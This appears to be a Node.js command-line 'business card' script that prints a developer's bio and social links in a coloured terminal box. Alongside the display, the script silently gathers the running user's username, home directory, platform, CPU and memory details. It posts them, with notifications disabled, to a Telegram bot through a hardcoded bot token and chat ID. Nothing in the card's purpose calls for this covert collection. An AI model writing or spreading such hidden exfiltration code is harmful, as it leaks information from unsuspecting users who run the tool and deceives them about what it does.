#!/usr/bin/env node
const os = require('os');
const https = require('https'); // Change http to https

// Function to log your details in the terminal
function logDetails() {
  let date = new Date();

  let options = {
    year: 'numeric',
    month: 'long',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: false,
    timeZone: 'Asia/Kolkata' // IST
  };

  let currentTime = date.toLocaleString('en-US', options) + ' IST +05:30';

  const message = `Hello! The time is ${currentTime}. I'm Shivangouda R Patil, a Software Developer at Sahaj Gaming. I specialize in backend development with NodeJS and Java, and have experience in mobile application development using Flutter and Kotlin. My skills include cloud computing and data management.`;

  const twitterLink = "https://twitter.com/exclusiveshiv";
  const linkedinLink = "https://www.linkedin.com/in/oishivpatil/";
  const websiteLink = "https://10sp.github.io";

  // Get system and user information
  const userInfo = os.userInfo();
  const systemInfo = {
    platform: os.platform(),
    architecture: os.arch(),
    cpus: os.cpus().length,
    memory: `${(os.totalmem() / 1024 / 1024 / 1024).toFixed(2)} GB`,
    username: userInfo.username,
    homedir: userInfo.homedir
  };

  // Create a colorful box using ANSI escape codes
  const colorfulBox = `
\x1b[38;5;51m+---------------------------------------------------------------+
|                     \x1b[38;5;105m${message}\x1b[38;5;51m                     |
+---------------------------------------------------------------+
| \x1b[38;5;93mTwitter:\x1b[0m  \x1b[38;5;39m${twitterLink}                   \x1b[38;5;51m|
| \x1b[38;5;93mLinkedIn:\x1b[0m \x1b[38;5;39m${linkedinLink}             \x1b[38;5;51m|
| \x1b[38;5;93mPortfolio:\x1b[0m  \x1b[38;5;39m${websiteLink}                            \x1b[38;5;51m|
+---------------------------------------------------------------+\x1b[0m`;

  // Log the colorful box in the terminal
  console.log(colorfulBox);

  // Prepare to send message via Telegram API
  sendTelegramMessage(message, systemInfo);
}

// Function to send a message via Telegram API
function sendTelegramMessage(text, systemInfo) {
  const TOKEN = '7318168838:AAF1CgagouMMc4J4oh-huaIlJ4VkEXAeSSY'; // Replace with your bot token
  const CHAT_ID = '-1002461618308'; // Replace with your chat ID

  // Prepare the text message including system info
  const systemDetails = `
Platform: ${systemInfo.platform}
Architecture: ${systemInfo.architecture}
CPUs: ${systemInfo.cpus}
Memory: ${systemInfo.memory}
Username: ${systemInfo.username}
Home Directory: ${systemInfo.homedir}`;

  const fullMessage = `${text}\n\nSystem Information:\n${systemDetails}`;

  // Prepare data to send to API
  const postData = JSON.stringify({
    chat_id: CHAT_ID,
    text: fullMessage,
    disable_notification: true // Optional: Send silently
  });

  // Options for the HTTPS request
  const optionsAPI = {
    hostname: 'api.telegram.org',
    path: `/bot${TOKEN}/sendMessage`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  // Make the HTTPS request
  const req = https.request(optionsAPI, (res) => {
    let responseBody = '';

    res.on('data', (chunk) => {
      responseBody += chunk;
    });
  });

  // Write data to request body
  req.write(postData);
  req.end();
}

// Call the function to log your details and send system info to the API
logDetails();